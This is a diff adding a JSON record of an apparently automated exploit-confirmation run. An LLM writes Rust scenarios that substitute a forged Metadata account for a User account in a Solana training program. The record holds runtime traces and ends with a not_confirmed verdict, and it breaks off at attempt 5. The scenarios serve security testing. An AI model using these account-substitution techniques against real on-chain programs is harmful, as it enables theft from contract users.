@@ -1,0 +1,490 @@
+{
+  "category": "COSPLAY",
+  "verdict": "not_confirmed",
+  "exploit_successful": false,
+  "attack_result": "Failure(InvalidAccountData)",
+  "reason": "baseline ok; ataque rejeitado: Failure(InvalidAccountData)",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2363,
+        "completion_tokens": 674,
+        "latency_s": 4.27
+      },
+      "raw": "{\n  \"plan\": \"O cenário monta uma conta `user` que pertence ao programa mas contém dados de `Metadata` (32 bytes com um Pubkey controlado pelo atacante), e uma conta `authority` que assina. O baseline usa uma conta `user` legítima com dados de `User` cujo authority é a chave do signer, provando que o cenário está correto. O ataque substitui a conta `user` por uma conta com dados de `Metadata` cujo campo `account` é a chave do signer, explorando a desserialização sem discriminador. O efeito medido é que a instrução aceita a conta de tipo errado e retorna sucesso, o que o uso legítimo não faria com dados de `Metadata`.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet user_legit = Pubkey::new_unique();\\nlet user_meta = Pubkey::new_unique();\\n\\n// Conta legítima: dados de User (authority = signer)\\nlet user_data_legit = anchor_account_data(\\\"User\\\", &(authority,));\\nlet user_account_legit = account(&env.program_id, &user_data_legit, None);\\n\\n// Conta maliciosa: dados de Metadata (account = signer)\\nlet meta_data = anchor_account_data(\\\"Metadata\\\", &(authority,));\\nlet user_account_meta = account(&env.program_id, &meta_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\n\\n// Baseline: uso legítimo com User\\nlet ix_baseline = env.anchor_ix(\\\"update_user\\\", &(), vec![\\n    AccountMeta::new_readonly(user_legit, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet contas_baseline = vec![\\n    (user_legit, user_account_legit),\\n    (authority, authority_account.clone()),\\n];\\nlet r_baseline = env.baseline(\\\"update_user com User legítimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: substitui user por conta com dados de Metadata\\nlet ix_attack = env.anchor_ix(\\\"update_user\\\", &(), vec![\\n    AccountMeta::new_readonly(user_meta, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet contas_attack = vec![\\n    (user_meta, user_account_meta),\\n    (authority, authority_account),\\n];\\nlet r_attack = env.attack(\\\"update_user com Metadata no lugar de User\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    env.effect(\\\"instrução aceitou conta de tipo Metadata como User\\\", true);\\n}\"\n}",
+      "plan": "O cenário monta uma conta `user` que pertence ao programa mas contém dados de `Metadata` (32 bytes com um Pubkey controlado pelo atacante), e uma conta `authority` que assina. O baseline usa uma conta `user` legítima com dados de `User` cujo authority é a chave do signer, provando que o cenário está correto. O ataque substitui a conta `user` por uma conta com dados de `Metadata` cujo campo `account` é a chave do signer, explorando a desserialização sem discriminador. O efeito medido é que a instrução aceita a conta de tipo errado e retorna sucesso, o que o uso legítimo não faria com dados de `Metadata`.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet user_legit = Pubkey::new_unique();\nlet user_meta = Pubkey::new_unique();\n\n// Conta legítima: dados de User (authority = signer)\nlet user_data_legit = anchor_account_data(\"User\", &(authority,));\nlet user_account_legit = account(&env.program_id, &user_data_legit, None);\n\n// Conta maliciosa: dados de Metadata (account = signer)\nlet meta_data = anchor_account_data(\"Metadata\", &(authority,));\nlet user_account_meta = account(&env.program_id, &meta_data, None);\n\nlet authority_account = wallet(1_000_000_000);\n\n// Baseline: uso legítimo com User\nlet ix_baseline = env.anchor_ix(\"update_user\", &(), vec![\n    AccountMeta::new_readonly(user_legit, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet contas_baseline = vec![\n    (user_legit, user_account_legit),\n    (authority, authority_account.clone()),\n];\nlet r_baseline = env.baseline(\"update_user com User legítimo\", &ix_baseline, &contas_baseline);\n\n// Ataque: substitui user por conta com dados de Metadata\nlet ix_attack = env.anchor_ix(\"update_user\", &(), vec![\n    AccountMeta::new_readonly(user_meta, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet contas_attack = vec![\n    (user_meta, user_account_meta),\n    (authority, authority_account),\n];\nlet r_attack = env.attack(\"update_user com Metadata no lugar de User\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    env.effect(\"instrução aceitou conta de tipo Metadata como User\", true);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "update_user com User legítimo",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3248,
+            "account_flags": "-r,sr",
+            "ix_head": "0902a0a9760ccf54",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "9f755fe3ef973aec",
+                "digest": "cc83b2d6cc3fbaaa",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_user com Metadata no lugar de User",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3248,
+            "account_flags": "-r,sr",
+            "ix_head": "0902a0a9760ccf54",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "480b791a6fb5555d",
+                "digest": "5a9402890723470f",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "[2026-10-14T00:09:43.758974285Z DEBUG solana_runtime::message_processor::stable_log] Program log: panicked at sealevel/sl_03_ins/src/lib.rs:10:75:     called `Result::unwrap()` on an `Err` value: Custom { kind: InvalidData, error: \"Not all bytes read\" }",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3248 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3248 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'update_user com User legítimo' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2899,
+        "completion_tokens": 746,
+        "latency_s": 4.95
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque a conta `user` foi passada como `AccountInfo` sem o discriminador de 8 bytes que o Anchor espera para `User`; o programa faz `User::try_from_slice` sobre os dados brutos, entao os dados devem ser apenas os 32 bytes do campo `authority` (sem discriminador). Vou montar a conta legitima com 32 bytes iguais a chave do signer e a conta maliciosa com 32 bytes iguais a chave do signer mas representando o layout de `Metadata`. O baseline chama `update_user` com a conta legitima (deve ter sucesso). O ataque substitui a conta `user` por uma conta com os mesmos 32 bytes, porem cujo conteudo e o campo `account` de `Metadata`; como nao ha discriminador, a desserializacao como `User` sera bem-sucedida e a comparacao de autoridade passara, demonstrando o type cosplay. O efeito mede que a instrucao aceitou a conta de outro tipo (sucesso do ataque).\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet user_legit = Pubkey::new_unique();\\nlet user_meta = Pubkey::new_unique();\\n\\n// Conta legítima: 32 bytes do campo authority (sem discriminador, pois o programa usa try_from_slice)\\nlet user_data_legit = authority.bytes();\\nlet user_account_legit = account(&env.program_id, &user_data_legit, None);\\n\\n// Conta maliciosa: 32 bytes do campo account de Metadata, com o mesmo valor do signer\\nlet meta_data = authority.bytes();\\nlet user_account_meta = account(&env.program_id, &meta_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\n\\n// Baseline: uso legítimo com User\\nlet ix_baseline = env.anchor_ix(\\\"update_user\\\", &(), vec![\\n    AccountMeta::new_readonly(user_legit, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet contas_baseline = vec![\\n    (user_legit, user_account_legit),\\n    (authority, authority_account.clone()),\\n];\\nlet r_baseline = env.baseline(\\\"update_user com User legítimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: substitui user por conta com dados de Metadata\\nlet ix_attack = env.anchor_ix(\\\"update_user\\\", &(), vec![\\n    AccountMeta::new_readonly(user_meta, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet contas_attack = vec![\\n    (user_meta, user_account_meta),\\n    (authority, authority_account),\\n];\\nlet r_attack = env.attack(\\\"update_user com Metadata no lugar de User\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    env.effect(\\\"instrução aceitou conta de tipo Metadata como User\\\", true);\\n}\"}",
+      "plan": "O baseline falhou porque a conta `user` foi passada como `AccountInfo` sem o discriminador de 8 bytes que o Anchor espera para `User`; o programa faz `User::try_from_slice` sobre os dados brutos, entao os dados devem ser apenas os 32 bytes do campo `authority` (sem discriminador). Vou montar a conta legitima com 32 bytes iguais a chave do signer e a conta maliciosa com 32 bytes iguais a chave do signer mas representando o layout de `Metadata`. O baseline chama `update_user` com a conta legitima (deve ter sucesso). O ataque substitui a conta `user` por uma conta com os mesmos 32 bytes, porem cujo conteudo e o campo `account` de `Metadata`; como nao ha discriminador, a desserializacao como `User` sera bem-sucedida e a comparacao de autoridade passara, demonstrando o type cosplay. O efeito mede que a instrucao aceitou a conta de outro tipo (sucesso do ataque).",
+      "scenario": "let authority = Pubkey::new_unique();\nlet user_legit = Pubkey::new_unique();\nlet user_meta = Pubkey::new_unique();\n\n// Conta legítima: 32 bytes do campo authority (sem discriminador, pois o programa usa try_from_slice)\nlet user_data_legit = authority.bytes();\nlet user_account_legit = account(&env.program_id, &user_data_legit, None);\n\n// Conta maliciosa: 32 bytes do campo account de Metadata, com o mesmo valor do signer\nlet meta_data = authority.bytes();\nlet user_account_meta = account(&env.program_id, &meta_data, None);\n\nlet authority_account = wallet(1_000_000_000);\n\n// Baseline: uso legítimo com User\nlet ix_baseline = env.anchor_ix(\"update_user\", &(), vec![\n    AccountMeta::new_readonly(user_legit, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet contas_baseline = vec![\n    (user_legit, user_account_legit),\n    (authority, authority_account.clone()),\n];\nlet r_baseline = env.baseline(\"update_user com User legítimo\", &ix_baseline, &contas_baseline);\n\n// Ataque: substitui user por conta com dados de Metadata\nlet ix_attack = env.anchor_ix(\"update_user\", &(), vec![\n    AccountMeta::new_readonly(user_meta, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet contas_attack = vec![\n    (user_meta, user_account_meta),\n    (authority, authority_account),\n];\nlet r_attack = env.attack(\"update_user com Metadata no lugar de User\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    env.effect(\"instrução aceitou conta de tipo Metadata como User\", true);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "update_user com User legítimo",
+            "result": "Success",
+            "compute_units": 7958,
+            "account_flags": "-r,sr",
+            "ix_head": "0902a0a9760ccf54",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000002",
+                "digest": "1af94aa75bdb9b97",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_user com Metadata no lugar de User",
+            "result": "Success",
+            "compute_units": 7958,
+            "account_flags": "-r,sr",
+            "ix_head": "0902a0a9760ccf54",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000002",
+                "digest": "1af94aa75bdb9b97",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "instrução aceitou conta de tipo Metadata como User",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 7958 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 7958 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o ataque nao exercita a hipotese de COSPLAY: e preciso que uma conta do ataque tem discriminador (8 primeiros bytes) diferente da conta na mesma posicao do baseline. Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca."
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2914,
+        "completion_tokens": 671,
+        "latency_s": 4.5
+      },
+      "raw": "{\"plan\": \"O baseline usa uma conta `user` com 32 bytes de dados (campo authority) pertencente ao programa, e um signer cuja chave coincide com o campo authority, fazendo a instrucao ter sucesso. O ataque substitui a conta `user` por uma conta com 8 bytes de discriminador de `Metadata` seguidos de 32 bytes de dados, de modo que os primeiros 8 bytes diferem do baseline (cosplay). Como o programa faz `try_from_slice` sem verificar discriminador, a desserializacao pode ler os bytes errados; medimos se a instrucao aceita a conta de outro tipo.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet user_legit = Pubkey::new_unique();\\nlet user_meta = Pubkey::new_unique();\\n\\n// Conta legítima: 32 bytes do campo authority (sem discriminador, pois o programa usa try_from_slice)\\nlet user_data_legit = authority.bytes();\\nlet user_account_legit = account(&env.program_id, &user_data_legit, None);\\n\\n// Conta maliciosa: discriminador de Metadata + 32 bytes de dados (cosplay)\\nlet mut meta_data = anchor_account_discriminator(\\\"Metadata\\\").to_vec();\\nmeta_data.extend_from_slice(&authority.bytes());\\nlet user_account_meta = account(&env.program_id, &meta_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\n\\n// Baseline: uso legítimo com User\\nlet ix_baseline = env.anchor_ix(\\\"update_user\\\", &(), vec![\\n    AccountMeta::new_readonly(user_legit, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet contas_baseline = vec![\\n    (user_legit, user_account_legit),\\n    (authority, authority_account.clone()),\\n];\\nlet r_baseline = env.baseline(\\\"update_user com User legítimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: substitui user por conta com dados de Metadata (discriminador diferente)\\nlet ix_attack = env.anchor_ix(\\\"update_user\\\", &(), vec![\\n    AccountMeta::new_readonly(user_meta, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet contas_attack = vec![\\n    (user_meta, user_account_meta),\\n    (authority, authority_account),\\n];\\nlet r_attack = env.attack(\\\"update_user com Metadata no lugar de User\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    env.effect(\\\"instrução aceitou conta de tipo Metadata como User\\\", true);\\n}\\n\"}",
+      "plan": "O baseline usa uma conta `user` com 32 bytes de dados (campo authority) pertencente ao programa, e um signer cuja chave coincide com o campo authority, fazendo a instrucao ter sucesso. O ataque substitui a conta `user` por uma conta com 8 bytes de discriminador de `Metadata` seguidos de 32 bytes de dados, de modo que os primeiros 8 bytes diferem do baseline (cosplay). Como o programa faz `try_from_slice` sem verificar discriminador, a desserializacao pode ler os bytes errados; medimos se a instrucao aceita a conta de outro tipo.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet user_legit = Pubkey::new_unique();\nlet user_meta = Pubkey::new_unique();\n\n// Conta legítima: 32 bytes do campo authority (sem discriminador, pois o programa usa try_from_slice)\nlet user_data_legit = authority.bytes();\nlet user_account_legit = account(&env.program_id, &user_data_legit, None);\n\n// Conta maliciosa: discriminador de Metadata + 32 bytes de dados (cosplay)\nlet mut meta_data = anchor_account_discriminator(\"Metadata\").to_vec();\nmeta_data.extend_from_slice(&authority.bytes());\nlet user_account_meta = account(&env.program_id, &meta_data, None);\n\nlet authority_account = wallet(1_000_000_000);\n\n// Baseline: uso legítimo com User\nlet ix_baseline = env.anchor_ix(\"update_user\", &(), vec![\n    AccountMeta::new_readonly(user_legit, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet contas_baseline = vec![\n    (user_legit, user_account_legit),\n    (authority, authority_account.clone()),\n];\nlet r_baseline = env.baseline(\"update_user com User legítimo\", &ix_baseline, &contas_baseline);\n\n// Ataque: substitui user por conta com dados de Metadata (discriminador diferente)\nlet ix_attack = env.anchor_ix(\"update_user\", &(), vec![\n    AccountMeta::new_readonly(user_meta, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet contas_attack = vec![\n    (user_meta, user_account_meta),\n    (authority, authority_account),\n];\nlet r_attack = env.attack(\"update_user com Metadata no lugar de User\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    env.effect(\"instrução aceitou conta de tipo Metadata como User\", true);\n}\n",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "update_user com User legítimo",
+            "result": "Success",
+            "compute_units": 7958,
+            "account_flags": "-r,sr",
+            "ix_head": "0902a0a9760ccf54",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000002",
+                "digest": "1af94aa75bdb9b97",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_user com Metadata no lugar de User",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3248,
+            "account_flags": "-r,sr",
+            "ix_head": "0902a0a9760ccf54",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "480b791a6fb5555d",
+                "digest": "5a9402890723470f",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "[2026-10-14T00:09:56.668625126Z DEBUG solana_runtime::message_processor::stable_log] Program log: panicked at sealevel/sl_03_ins/src/lib.rs:10:75:     called `Result::unwrap()` on an `Err` value: Custom { kind: InvalidData, error: \"Not all bytes read\" }",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 7958 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3248 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "not_confirmed",
+      "reason": "baseline ok; ataque rejeitado: UnknownError(ProgramFailedToComplete)"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2890,
+        "completion_tokens": 624,
+        "latency_s": 4.68
+      },
+      "raw": "{\"plan\":\"O baseline usa uma conta `user` de 32 bytes pertencente ao programa, com `authority` igual ao signer, e deve ter sucesso. O ataque substitui essa conta por uma conta de 32 bytes com dados de `Metadata` (mesmo layout), mantendo o mesmo signer, para testar se a desserializacao manual aceita outro tipo. Como o programa verifica `owner == program_id` e compara `authority`, o ataque so demonstra dano se a instrucao retornar sucesso com a conta cosplay.\",\"scenario\":\"let authority = Pubkey::new_unique();\\nlet user_legit = Pubkey::new_unique();\\nlet user_meta = Pubkey::new_unique();\\n\\n// Conta legítima: 32 bytes do campo authority (sem discriminador, pois o programa usa try_from_slice)\\nlet user_data_legit = authority.bytes();\\nlet user_account_legit = account(&env.program_id, &user_data_legit, None);\\n\\n// Conta maliciosa: 32 bytes de dados de Metadata, pertencente ao programa\\nlet meta_data = authority.bytes();\\nlet user_account_meta = account(&env.program_id, &meta_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\n\\n// Baseline: uso legítimo com User\\nlet ix_baseline = env.anchor_ix(\\\"update_user\\\", &(), vec![\\n    AccountMeta::new_readonly(user_legit, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet contas_baseline = vec![\\n    (user_legit, user_account_legit),\\n    (authority, authority_account.clone()),\\n];\\nlet r_baseline = env.baseline(\\\"update_user com User legítimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: substitui user por conta com dados de Metadata (mesmo layout, sem discriminador)\\nlet ix_attack = env.anchor_ix(\\\"update_user\\\", &(), vec![\\n    AccountMeta::new_readonly(user_meta, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet contas_attack = vec![\\n    (user_meta, user_account_meta),\\n    (authority, authority_account),\\n];\\nlet r_attack = env.attack(\\\"update_user com Metadata no lugar de User\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    env.effect(\\\"instrução aceitou conta de tipo Metadata como User\\\", true);\\n}\"}",
+      "plan": "O baseline usa uma conta `user` de 32 bytes pertencente ao programa, com `authority` igual ao signer, e deve ter sucesso. O ataque substitui essa conta por uma conta de 32 bytes com dados de `Metadata` (mesmo layout), mantendo o mesmo signer, para testar se a desserializacao manual aceita outro tipo. Como o programa verifica `owner == program_id` e compara `authority`, o ataque so demonstra dano se a instrucao retornar sucesso com a conta cosplay.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet user_legit = Pubkey::new_unique();\nlet user_meta = Pubkey::new_unique();\n\n// Conta legítima: 32 bytes do campo authority (sem discriminador, pois o programa usa try_from_slice)\nlet user_data_legit = authority.bytes();\nlet user_account_legit = account(&env.program_id, &user_data_legit, None);\n\n// Conta maliciosa: 32 bytes de dados de Metadata, pertencente ao programa\nlet meta_data = authority.bytes();\nlet user_account_meta = account(&env.program_id, &meta_data, None);\n\nlet authority_account = wallet(1_000_000_000);\n\n// Baseline: uso legítimo com User\nlet ix_baseline = env.anchor_ix(\"update_user\", &(), vec![\n    AccountMeta::new_readonly(user_legit, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet contas_baseline = vec![\n    (user_legit, user_account_legit),\n    (authority, authority_account.clone()),\n];\nlet r_baseline = env.baseline(\"update_user com User legítimo\", &ix_baseline, &contas_baseline);\n\n// Ataque: substitui user por conta com dados de Metadata (mesmo layout, sem discriminador)\nlet ix_attack = env.anchor_ix(\"update_user\", &(), vec![\n    AccountMeta::new_readonly(user_meta, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet contas_attack = vec![\n    (user_meta, user_account_meta),\n    (authority, authority_account),\n];\nlet r_attack = env.attack(\"update_user com Metadata no lugar de User\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    env.effect(\"instrução aceitou conta de tipo Metadata como User\", true);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "update_user com User legítimo",
+            "result": "Success",
+            "compute_units": 7958,
+            "account_flags": "-r,sr",
+            "ix_head": "0902a0a9760ccf54",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000002",
+                "digest": "1af94aa75bdb9b97",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_user com Metadata no lugar de User",
+            "result": "Success",
+            "compute_units": 7958,
+            "account_flags": "-r,sr",
+            "ix_head": "0902a0a9760ccf54",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000002",
+                "digest": "1af94aa75bdb9b97",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "instrução aceitou conta de tipo Metadata como User",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 7958 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 7958 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque nao exercita a hipotese de COSPLAY: e preciso que uma conta do ataque tem discriminador (8 primeiros bytes) diferente da conta na mesma posicao do baseline. Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca."
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2918,
+        "completion_tokens": 674,
+        "latency_s": 4.11
+      },
